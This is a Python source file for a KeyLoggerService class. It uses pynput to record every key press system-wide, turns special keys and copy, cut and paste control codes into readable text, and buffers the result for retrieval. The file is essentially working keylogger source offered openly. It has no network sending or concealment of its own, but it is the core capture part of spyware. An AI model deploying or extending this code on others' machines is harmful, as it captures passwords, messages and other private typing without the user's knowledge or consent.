import pprint
from pynput.keyboard import Listener
from datetime import datetime
from KeyLoggerBase import IKeyLogger
import time


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.logged_keys = []
        self.listener = None

    def start_logging(self) -> None:
        if self.listener is None:
            self.listener = Listener(on_press= self.on_key_press)
            self.listener.start()

    def stop_logging(self) ->None:
        if self.listener is not None:
            self.listener.stop()
            self.listener = None

    def get_logged_keys(self) ->list[str]:
        temp =  self.logged_keys
        self.logged_keys = []
        return temp

    def on_key_press(self,key):
        key = str(key).replace("'", "")
        if key == 'Key.space':
            key = ' '
        if key == 'Key.enter':
            key = '\n'
        if key == 'Key.up':
            key = ''
        if key == 'Key.right':
            key = ' '
        if key == 'Key.left':
            key = ''
        if key == 'Key.down':
            key = '\n'
        if key == 'Key.ctrl_l':
            key = 'ctrl '
        if key == '\\x03':
            key = 'copy '
        if key == 'Key.backspace':
            key = ''
        if key == '\\x18':
            key = 'cut '
        if key == '\\x16':
            key = 'paste '
        if not key.isalpha() or key.isnumeric():
            key = ' {0} '.format(key)

        self.logged_keys.append(key)





